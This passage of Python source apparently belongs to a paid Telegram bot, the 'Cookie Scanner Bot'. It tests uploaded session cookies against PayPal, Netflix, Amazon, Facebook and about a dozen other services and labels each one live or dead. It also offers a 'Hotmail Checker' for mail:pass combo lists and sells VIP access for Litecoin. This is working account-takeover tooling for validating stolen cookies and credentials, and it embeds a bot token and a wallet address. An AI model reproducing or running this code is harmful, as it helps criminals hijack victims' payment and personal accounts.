            return {'status': 'success','message': 'Cookie LIVE','final_url': final_url,'status_code': status_code,'plan_info': f'Plan: {plan}'}
        else:
            return {'status': 'unknown','message': 'Unexpected response','final_url': final_url,'status_code': status_code}
    except Exception as e:
        return {'status': 'error','message': f'Error testing CapCut login: {str(e)}'}

def test_paypal_login(cookies):
    try:
        session = requests.Session()
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.paypal.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        target_url = "https://www.paypal.com/myaccount/profile/"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=True)
        status_code = response.status_code
        final_url = response.url
        if '/signin' in final_url.lower() or 'signin?returnUri' in final_url.lower():
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Redirected to signin page',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD'
            }
        if status_code == 200 and '/myaccount/profile' in final_url.lower():
            return {
                'status': 'success',
                'message': 'Cookie LIVE',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: LIVE'
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing PayPal cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing PayPal login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

SCAN_TARGETS = {
    "netflix": {"url": "https://www.netflix.com/account","contains": "Account","domains": [".netflix.com", "netflix.com"]},
    "spotify": {"url": "https://www.spotify.com/account/overview/","contains": "Overview","domains": [".spotify.com", "spotify.com"]},
    "tiktok": {"url": "https://www.tiktok.com/setting","contains": "Settings","domains": [".tiktok.com", "tiktok.com"]},
    "facebook": {"url": "https://www.facebook.com/settings","contains": "Settings","domains": [".facebook.com", "facebook.com"]},
    "canva": {"url": "https://www.canva.com/settings/","contains": "Settings","domains": [".canva.com", "canva.com"]},
    "roblox": {"url": "https://www.roblox.com/home","contains": "Home","domains": [".roblox.com", "roblox.com"]},
    "instagram": {"url": "https://www.instagram.com/accounts/edit/","contains": "Edit","domains": [".instagram.com", "instagram.com"]},
    "youtube": {"url": "https://www.youtube.com/account","contains": "Account","domains": [".youtube.com", "youtube.com"]},
    "linkedin": {"url": "https://www.linkedin.com/mypreferences/d/categories/account","contains": "Preferences","domains": [".linkedin.com", "linkedin.com"]},
    "amazon": {"url": "https://www.amazon.com/gp/your-account/order-history","contains": "Order","domains": [".amazon.com", "amazon.com"]},
    "wordpress": {"url": "https://wordpress.com/me/","contains": "Me","domains": [".wordpress.com", "wordpress.com"]},
    "capcut": {"url": "https://www.capcut.com/my-edit","contains": "My Edit","domains": [".capcut.com", "capcut.com"]},
    "paypal": {"url": "https://www.paypal.com/myaccount/profile/","contains": "profile","domains": [".paypal.com", "www.paypal.com", "paypal.com"]}
}

SERVICE_TEST_FUNCTIONS = {
    'netflix': test_netflix_login,
    'spotify': test_spotify_login,
    'tiktok': test_tiktok_login,
    'facebook': test_facebook_login,
    'canva': test_canva_login,
    'roblox': test_roblox_login,
    'instagram': test_instagram_login,
    'youtube': test_youtube_login,
    'linkedin': test_linkedin_login,
    'amazon': test_amazon_login,
    'wordpress': test_wordpress_login,
    'capcut': test_capcut_login,
    'paypal': test_paypal_login
}

SERVICES = {
    'netflix': 'Netflix',
    'spotify': 'Spotify',
    'tiktok': 'TikTok',
    'facebook': 'Facebook',
    'canva': 'Canva',
    'roblox': 'Roblox',
    'instagram': 'Instagram',
    'youtube': 'YouTube',
    'linkedin': 'LinkedIn',
    'amazon': 'Amazon',
    'wordpress': 'WordPress',
    'capcut': 'CapCut',
    'paypal': 'PayPal'
}

PAYMENT_ACCOUNTS = {
    'ltc': 'LbqPiubpXWrL27VMUGxu2AhdvQmVA37LEL'
}

BOT_TOKEN = "8132478896:AAEFEsVHPPSbrfPLIqNtFP0CQQjTqg7DSbA"
ADMIN_USER_ID = "6557052839"
CHANNEL_INVITE_LINK = os.environ.get("CHANNEL_INVITE_LINK", "https://t.me/+-XbtP90HxSE1ZjE1")
PRIVATE_BLOCK_MESSAGE = "You must join our channel chat to use the bot."

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

users_db_path = "users_db.json"
if not os.path.exists(users_db_path):
    with open(users_db_path, "w", encoding="utf-8") as f:
        json.dump({}, f)

with open(users_db_path, "r", encoding="utf-8") as f:
    try:
        users_db = json.load(f)
    except json.JSONDecodeError:
        users_db = {}

NORMAL_PLAN_LIMIT = 50
NORMAL_PLAN_RESET_HOURS = 24

daily_stats_path = "daily_stats.json"
if not os.path.exists(daily_stats_path):
    with open(daily_stats_path, "w", encoding="utf-8") as f:
        json.dump({"date": datetime.now().strftime("%Y-%m-%d"), "scans": 0}, f)

with open(daily_stats_path, "r", encoding="utf-8") as f:
    try:
        daily_stats = json.load(f)
    except json.JSONDecodeError:
        daily_stats = {"date": datetime.now().strftime("%Y-%m-%d"), "scans": 0}

keys_db_path = "keys_db.json"
if not os.path.exists(keys_db_path):
    with open(keys_db_path, "w", encoding="utf-8") as f:
        json.dump({}, f)

with open(keys_db_path, "r", encoding="utf-8") as f:
    try:
        keys_db = json.load(f)
    except json.JSONDecodeError:
        keys_db = {}

def save_users_db():
    with open(users_db_path, "w", encoding="utf-8") as f:
        json.dump(users_db, f, ensure_ascii=False, indent=2)

def save_daily_stats():
    with open(daily_stats_path, "w", encoding="utf-8") as f:
        json.dump(daily_stats, f, ensure_ascii=False, indent=2)

def save_keys_db():
    with open(keys_db_path, "w", encoding="utf-8") as f:
        json.dump(keys_db, f, ensure_ascii=False, indent=2)

def reset_daily_stats_if_needed():
    today = datetime.now().strftime("%Y-%m-%d")
    if daily_stats.get("date") != today:
        daily_stats["date"] = today
        daily_stats["scans"] = 0
        save_daily_stats()

def increment_daily_scans(count):
    reset_daily_stats_if_needed()
    daily_stats["scans"] += count
    save_daily_stats()

def is_registered(user_id):
    user_id_str = str(user_id)
    return user_id_str in users_db and users_db[user_id_str].get('registered', False)

def get_user_record(user_id):
    user_id_str = str(user_id)
    changed = False
    if user_id_str not in users_db:
        users_db[user_id_str] = {
            'registered': False,
            'plan': 'normal',
            'file_count': 0,
            'last_reset': datetime.now().isoformat(),
            'vip_expiry': None,
            'vip_start': None,
            'join_date': None
        }
        changed = True
    data = users_db[user_id_str]
    if user_id_str == ADMIN_USER_ID:
        if data.get('plan') != 'vip' or data.get('vip_expiry') is not None or data.get('vip_start') is not None:
            data['plan'] = 'vip'
            data['vip_expiry'] = None
            data['vip_start'] = None
            changed = True
    else:
        if data.get('plan') == 'vip' and data.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(data['vip_expiry'])
            if datetime.now() > expiry_date:
                data['plan'] = 'normal'
                data['vip_expiry'] = None
                data['vip_start'] = None
                changed = True
    if changed:
        save_users_db()
    return data

def is_restricted_private(user_id, chat_id):
    if str(chat_id).startswith("-"):
        return False
    if str(user_id) == ADMIN_USER_ID:
        return False
    user_data = get_user_record(user_id)
    if user_data.get('plan') == 'vip':
        return False
    return True

def can_user_scan(user_id):
    user_data = get_user_record(user_id)
    if str(user_id) == ADMIN_USER_ID:
        return True, ""
    if user_data['plan'] == 'vip':
        return True, ""
    last_reset = datetime.fromisoformat(user_data['last_reset'])
    if datetime.now() - last_reset > timedelta(hours=NORMAL_PLAN_RESET_HOURS):
        user_data['file_count'] = 0
        user_data['last_reset'] = datetime.now().isoformat()
        save_users_db()
    if user_data['file_count'] >= NORMAL_PLAN_LIMIT:
        reset_time = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = reset_time - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        return False, f"You have used all {NORMAL_PLAN_LIMIT} scan attempts. Please wait {hours} hours {minutes} minutes to reset or upgrade to VIP!"
    return True, ""

def increment_file_count(user_id):
    user_data = get_user_record(user_id)
    user_data['file_count'] += 1
    save_users_db()

def set_vip_with_duration(user_id, days):
    user_id_str = str(user_id)
    if user_id_str not in users_db:
        return False
    expiry_date = datetime.now() + timedelta(days=days)
    now = datetime.now().isoformat()
    users_db[user_id_str]['plan'] = 'vip'
    users_db[user_id_str]['vip_expiry'] = expiry_date.isoformat()
    users_db[user_id_str]['vip_start'] = now
    users_db[user_id_str]['file_count'] = 0
    save_users_db()
    return True

def generate_random_key():
    segments = []
    for _ in range(4):
        segment = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
        segments.append(segment)
    return '-'.join(segments)

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    if 'hour' in duration_str or 'hours' in duration_str or 'h' in duration_str:
        hours = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(hours=hours)
    elif 'day' in duration_str or 'days' in duration_str or 'd' in duration_str:
        days = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(days=days)
    elif 'week' in duration_str or 'weeks' in duration_str or 'w' in duration_str:
        weeks = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(weeks=weeks)
    elif 'month' in duration_str or 'months' in duration_str or 'm' in duration_str:
        months = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(days=months * 30)
    else:
        hours = int(''.join(filter(str.isdigit, duration_str)) or 1)
        return timedelta(hours=hours)

def format_duration(delta):
    total_seconds = int(delta.total_seconds())
    days = total_seconds // 86400
    hours = (total_seconds % 86400) // 3600
    minutes = (total_seconds % 3600) // 60
    
    parts = []
    if days > 0:
        parts.append(f"{days} day{'s' if days > 1 else ''}")
    if hours > 0:
        parts.append(f"{hours} hour{'s' if hours > 1 else ''}")
    if minutes > 0 and days == 0:
        parts.append(f"{minutes} minute{'s' if minutes > 1 else ''}")
    
    return " ".join(parts) if parts else "0 minutes"

def create_key(duration_str, max_users, created_by):
    key = generate_random_key()
    duration = parse_duration(duration_str)
    expiry_date = datetime.now() + duration
    
    keys_db[key] = {
        'key': key,
        'duration': duration_str,
        'duration_seconds': int(duration.total_seconds()),
        'max_users': int(max_users),
        'created_by': str(created_by),
        'created_at': datetime.now().isoformat(),
        'expires_at': expiry_date.isoformat(),
        'activated_by': []
    }
    save_keys_db()
    return key

def activate_key(key, user_id, username, first_name):
    if key not in keys_db:
        return False, "Invalid or non-existent key."
    
    key_data = keys_db[key]
    
    expires_at = datetime.fromisoformat(key_data['expires_at'])
    if datetime.now() > expires_at:
        return False, "Key has expired."
    
    user_id_str = str(user_id)
    activated_by = key_data['activated_by']
    for activation in activated_by:
        if activation.get('user_id') == user_id_str:
            return False, "You have already used this key."
    
    if len(activated_by) >= key_data['max_users']:
        return False, "Key is full, cannot activate."
    
    activation_info = {
        'user_id': user_id_str,
        'username': username or 'N/A',
        'first_name': first_name or 'N/A',
        'activated_at': datetime.now().isoformat()
    }
    activated_by.append(activation_info)
    key_data['activated_by'] = activated_by
    
    duration = timedelta(seconds=key_data['duration_seconds'])
    days = duration.days + (1 if duration.seconds > 0 else 0)
    set_vip_with_duration(user_id, days)
    
    save_keys_db()
    
    remaining = key_data['max_users'] - len(activated_by)
    is_full = remaining == 0
    
    return True, {
        'key': key,
        'remaining': remaining,
        'max_users': key_data['max_users'],
        'is_full': is_full,
        'activation_info': activation_info
    }

async def show_start_login(update: Update = None, query=None):
    keyboard = [[InlineKeyboardButton("Login", callback_data="login_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "Welcome\n\nTap Login to continue."
    if query:
        await query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    chat_id = chat.id if chat else None

    if user and chat_id is not None and not str(chat_id).startswith("-"):
        user_data = get_user_record(user.id)
        if user_data.get('plan') != 'vip' and str(user.id) != ADMIN_USER_ID:
            keyboard = [
                [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33")],
                [InlineKeyboardButton("Join Channel Chat", url="https://t.me/+IDNwVF4Ue1AyOTVl")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "Your current plan is Normal.\n\n"
                "To use this bot in private chat, please contact the owner to buy VIP\n"
                "or join our channel chat to use the bot for free."
            )
            await update.message.reply_text(text, reply_markup=reply_markup)
            return

    await show_start_login(update=update)

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    keyboard = [
        [InlineKeyboardButton("Services List", callback_data="services_list"),
         InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
        [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
        [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
         InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
    ]
    if str(user.id) == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Cookie Scanner Bot Menu\n\nChoose an option:", reply_markup=reply_markup)

async def check_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    user_id = user.id
    user_data = get_user_record(user_id)
    plan_text = "VIP" if user_data['plan'] == 'vip' else "Normal"
    used_files = user_data['file_count']
    max_files = "Unlimited" if user_data['plan'] == 'vip' else NORMAL_PLAN_LIMIT
    vip_info = ""
    if user_data['plan'] == 'vip' and user_data.get('vip_expiry'):
        expiry_date = datetime.fromisoformat(user_data['vip_expiry'])
        remaining = expiry_date - datetime.now()
        if remaining.total_seconds() > 0:
            days = remaining.days
            hours = int(remaining.seconds // 3600)
            vip_info = f"\nVIP expires in: {days} days {hours} hours"
        else:
            vip_info = "\nVIP expired"
    if user_data['plan'] == 'normal':
        last_reset = datetime.fromisoformat(user_data['last_reset'])
        next_reset = last_reset + timedelta(hours=NORMAL_PLAN_RESET_HOURS)
        remaining = next_reset - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        reset_info = f"\nReset in: {hours} hours {minutes} minutes"
    else:
        reset_info = ""
    keyboard = [
        [InlineKeyboardButton("Contact Owner", url="https://t.me/TSP1K33"),InlineKeyboardButton("Buy VIP Plan", callback_data="buy_vip")],
        [InlineKeyboardButton("Back", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = f"""Your Plan Information:

Plan: {plan_text}
Used: {used_files}/{max_files} files{vip_info}{reset_info}

VIP Plan Pricing:
• 1 Week: 50,000 VND- 3,79 USDT 
• 3 Weeks: 120,000 VND - 5,69 USDT  
• 1 Month: 150,000 VND - 7,59 USDT 

Contact Owner @TSP1K33 to upgrade!"""
    if update.callback_query:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup)
    else:
        await update.message.reply_text(message, reply_markup=reply_markup)

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user or (update.callback_query.from_user if update.callback_query else None)
    if not user or str(user.id) != ADMIN_USER_ID:
        await (update.callback_query.message if update.callback_query else update.message).reply_text("You don't have permission to use this command!")
        return
    total_users = len(users_db)
    normal_users = sum(1 for u in users_db.values() if u.get('plan') == 'normal')
    vip_users = sum(1 for u in users_db.values() if u.get('plan') == 'vip')
    total_scans = sum(u.get('file_count', 0) for u in users_db.values())
    expiring_vip = 0
    for u in users_db.values():
        if u.get('plan') == 'vip' and u.get('vip_expiry'):
            expiry_date = datetime.fromisoformat(u['vip_expiry'])
            if expiry_date - datetime.now() < timedelta(days=7):
                expiring_vip += 1
    header = f"{'User ID':<15}{'Plan':<8}{'VIP Expiry':<20}"
    lines = [header, "-"*len(header)]
    for uid, data in users_db.items():
        plan = data.get('plan','')
        expiry = data.get('vip_expiry') or "-"
        if expiry != "-":
            expiry = datetime.fromisoformat(expiry).strftime("%Y-%m-%d %H:%M")
        lines.append(f"{uid:<15}{plan:<8}{expiry:<20}")
    table = "\n".join(lines)
    message = f"""System Statistics:

Total users: {total_users}
Normal users: {normal_users}
VIP users: {vip_users}
Total scans: {total_scans}
VIP expiring soon (7d): {expiring_vip}

{table}"""
    await (update.callback_query.message if update.callback_query else update.message).reply_text(message)

async def admin_set_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setvip <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    if set_vip_with_duration(target_id, days):
        await update.message.reply_text(f"Set VIP for user {target_id} for {days} days.")
    else:
        await update.message.reply_text("Failed to set VIP. User not found.")

async def admin_del_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /delvip <user_id>")
        return
    target_id = int(args[0])
    target_id_str = str(target_id)
    if target_id_str in users_db:
        users_db[target_id_str]['plan'] = 'normal'
        users_db[target_id_str]['vip_expiry'] = None
        users_db[target_id_str]['vip_start'] = None
        save_users_db()
        await update.message.reply_text(f"Removed VIP from user {target_id}.")
    else:
        await update.message.reply_text("User not found.")

async def admin_get_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /getkey <duration> <max_users>\nExample: /getkey 1hours 1 or /getkey 1day 5")
        return
    
    last_arg = args[-1]
    try:
        max_users = int(last_arg)
        if max_users <= 0:
            await update.message.reply_text("Max users must be greater than 0.")
            return
    except ValueError:
        await update.message.reply_text("Max users must be a number.")
        return
    
    duration_str = ' '.join(args[:-1])
    
    try:
        key = create_key(duration_str, max_users, user.id)
        duration_delta = parse_duration(duration_str)
        duration_formatted = format_duration(duration_delta)
        message = (
            "┌── ⋆⋅☆⋅⋆ ── KEY BOT CHECKER ── ⋆⋅☆⋅⋆ ──┐\n\n"
            "   ░▒▓█ KEY CREATED SUCCESSFULLY █▓▒░\n\n"
            f"   ⫸ Key: {key}\n"
            f"   ⫸ Duration: {duration_formatted}\n"
            f"   ⫸ Max Users: {max_users}\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   /activatekey\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ STATUS: SUCCESS\n\n"
            "└───────────────────────────────────────┘"
        )
        await update.message.reply_text(message, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error creating key: {str(e)}")

async def admin_remove_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or str(user.id) != ADMIN_USER_ID:
        await update.message.reply_text("You don't have permission to use this command!")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /removekey <key>\nExample: /removekey ABCD1-EFGH2-IJKL3-MNOP4")
        return
    
    key = args[0].strip().upper()
    
    if key not in keys_db:
        await update.message.reply_text(f"Key {key} not found.")
        return
    
    key_data = keys_db[key]
    activated_count = len(key_data.get('activated_by', []))
    
    del keys_db[key]
    save_keys_db()
    
    message = f"Key removed successfully!\n\nKey: {key}\nActivated users: {activated_count}"
    await update.message.reply_text(message)

async def activate_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or not is_registered(user.id):
        await show_start_login(update=update)
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /activatekey <key>\nExample: /activatekey ABCD1-EFGH2-IJKL3-MNOP4")
        return
    
    key = args[0].strip().upper()
    username = user.username
    first_name = user.first_name
    
    success, result = activate_key(key, user.id, username, first_name)
    
    if not success:
        error_text = str(result)
        if error_text == "Invalid or non-existent key.":
            message = (
                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
                "   ░▒▓█ INVALID KEY DETECTED █▓▒░\n\n"
                "   ⫸ Key: NOT FOUND\n"
                "   ⫸ Error: The key you entered is \n"
                "            incorrect or does not exist.\n\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                "   Please check your key again or \n"
                "   contact admin for support.\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                "   ➜ STATUS: FAILED ❌\n\n"
                "└────────────────────────────────────────┘"
            )
            await update.message.reply_text(message)
            return
        elif error_text == "Key has expired." or error_text == "Key is full, cannot activate.":
            key_data = keys_db.get(key, {})
            max_users = key_data.get('max_users', 0)
            activated_count = len(key_data.get('activated_by', []))
            remaining = max_users - activated_count if max_users else 0
            remaining_slots = f"{remaining}/{max_users}" if max_users else "0/0"
            expires_at = key_data.get('expires_at')
            expiry_str = "Unknown"
            if expires_at:
                try:
                    expiry_dt = datetime.fromisoformat(expires_at)
                    expiry_str = expiry_dt.strftime("%Y-%m-%d %H:%M:%S")
                except Exception:
                    expiry_str = expires_at
            message = (
                "┌─── ⋆⋅☆⋅⋆ ── SYSTEM WARNING ── ⋆⋅☆⋅⋆ ───┐\n\n"
                "   ░▒▓█ ACCESS DENIED █▓▒░\n\n"
                f"   ⫸ Key: {key}\n"
                "   ⫸ Reason: Key has expired or \n"
                "             reached maximum usage.\n\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
                f"   ➜ Remaining slots: {remaining_slots}\n"
                f"   ➜ Expiry: {expiry_str}\n"
                "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
                "   ➜ STATUS: EXPIRED ⚠️\n\n"
                "└────────────────────────────────────────┘"
            )
            await update.message.reply_text(message)
            return
        else:
            await update.message.reply_text(error_text)
            return
    
    activation_info = result['activation_info']
    remaining = result['remaining']
    max_users = result['max_users']
    
    user_message = (
        "Your key has been activated successfully!\n\n"
        f"Key: {key}\n"
        f"Remaining slots: {remaining}/{max_users}"
    )
    await update.message.reply_text(user_message)
    
    admin_message = (
        "┌─── ⋆⋅☆⋅⋆ ── KEY ACTIVATION ── ⋆⋅☆⋅⋆ ───┐\n\n"
        "   ░▒▓█ NOTIFICATION █▓▒░\n\n"
        f"   ⫸ Key: {key}\n"
        f"   ⫸ Activated by: {activation_info['first_name']} (@{activation_info['username']})\n"
        f"   ⫸ User ID: {activation_info['user_id']}\n"
        f"   ⫸ Time: {datetime.fromisoformat(activation_info['activated_at']).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
        f"   ➜ Remaining slots: {remaining}/{max_users}\n"
        "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
        "   ➜ STATUS: ACTIVATED ✅\n\n"
        "└────────────────────────────────────────┘"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_message)
    except Exception as e:
        logger.error(f"Error sending notification to admin: {e}")

async def login_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
    else:
        user = update.effective_user

    registered = user is not None and is_registered(user.id)

    if registered:
        keyboard = [
            [InlineKeyboardButton("Services List", callback_data="services_list"),
             InlineKeyboardButton("Scan All Services", callback_data="scan_all")],
            [InlineKeyboardButton("Hotmail Checker", callback_data="hotmail_checker")],
            [InlineKeyboardButton("Check Plan", callback_data="check_plan"),
             InlineKeyboardButton("Buy VIP", callback_data="buy_vip")]
        ]
        if str(user.id) == ADMIN_USER_ID:
            keyboard.append([InlineKeyboardButton("Admin Panel", callback_data="admin_panel")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Cookie Scanner Bot Menu\n\nChoose an option:"
    else:
        keyboard = [
            [InlineKeyboardButton("Create Account", callback_data="create_account")],
            [InlineKeyboardButton("Help", callback_data="help_menu")],
            [InlineKeyboardButton("Back", callback_data="back_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = "Login Menu\n\nChoose an option:"

    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        query = update.callback_query
        user = query.from_user
    else:
        user = update.effective_user

    keyboard = [
        [InlineKeyboardButton("Create Account", callback_data="create_account")],
        [InlineKeyboardButton("Login", callback_data="login_menu")],
        [InlineKeyboardButton("Back", callback_data="back_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = "Help\n\nYou must create an account and then log in before using the bot."

    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def create_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user:
        return
    user_id = user.id
    user_id_str = str(user_id)
    data = get_user_record(user_id)
    if not data.get('registered'):
        users_db[user_id_str]['registered'] = True
        users_db[user_id_str]['join_date'] = datetime.now().isoformat()
        if user_id_str != ADMIN_USER_ID and users_db[user_id_str]['plan'] != 'vip':
            users_db[user_id_str]['plan'] = 'normal'
        save_users_db()
    data = users_db[user_id_str]
    plan_text = "VIP" if data['plan'] == 'vip' else "Normal"
    keyboard = [
        [InlineKeyboardButton("Help", callback_data="help_menu")],
        [InlineKeyboardButton("Main Menu", callback_data="main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = f"Account Created\n\nUser: {user.first_name or user.username}\nUser ID: {user_id}\nPlan: {plan_text}\nJoin Date: {data.get('join_date','')}"
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    if not user:
        return
    user_id = user.id
    data = query.data
    chat_id = query.message.chat.id

    if data == 'back_start':
        await show_start_login(query=query)
        return

    if data == 'login_menu':
        await login_menu(update, context)
        return

    if data == 'help_menu':
        await help_menu(update, context)
        return

    if data == 'create_account':
        await create_account(update, context)
        return

    if not is_registered(user_id):
        keyboard = [[InlineKeyboardButton("Login", callback_data="login_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "Please create an account to use the bot.\nTap Login to continue.",
            reply_markup=reply_markup
        )
        return
    
    if data == 'buy_vip':
        wallet_address = PAYMENT_ACCOUNTS['ltc']
        keyboard = [
            [InlineKeyboardButton("Copy LTC", callback_data="copy_ltc")],
            [InlineKeyboardButton("Back", callback_data="main_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = (
            "VIP Plan Pricing:\n"
            "• 1 Week: 50,000 VND\n"
            "• 3 Weeks: 120,000 VND\n"
            "• 1 Month: 150,000 VND\n\n"
            "Payment Method:\n"
            "• Litecoin (LTC)\n"
            f"• LTC Wallet: {wallet_address}\n\n"
            "After payment, send the transaction hash and your Telegram ID to @TSP1K33."
        )
        await query.edit_message_text(text, reply_markup=reply_markup)
        return

    if data == 'hotmail_checker':
        context.user_data['mode'] = 'hotmail_checker'
        context.user_data.pop('selected_service', None)
        keyboard = [[InlineKeyboardButton("Back", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "┌─── ⋆⋅☆⋅⋆ ── HOTMAIL CHECKER ── ⋆⋅☆⋅⋆ ───┐\n\n"
            "   ░▒▓█ SYSTEM READY █▓▒░\n\n"
            "   ⫸ Status: 🟢 Waiting for Input\n"
            "   ⫸ Format: mail:pass\n"
            "   ⫸ Extension: .txt only\n\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n"
            "   ⚠️  INSTRUCTION:\n"
            "   Please send a .txt file containing \n"
            "   hotmail in format mail:pass, \n"
            "   one per line.\n"
            "   ┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n\n"
            "   ➜ [✔] Auto-detect format\n"
            "   ➜ [✔] Fast multi-threading\n"
            "   ➜ [✔] Real-time results\n\n"
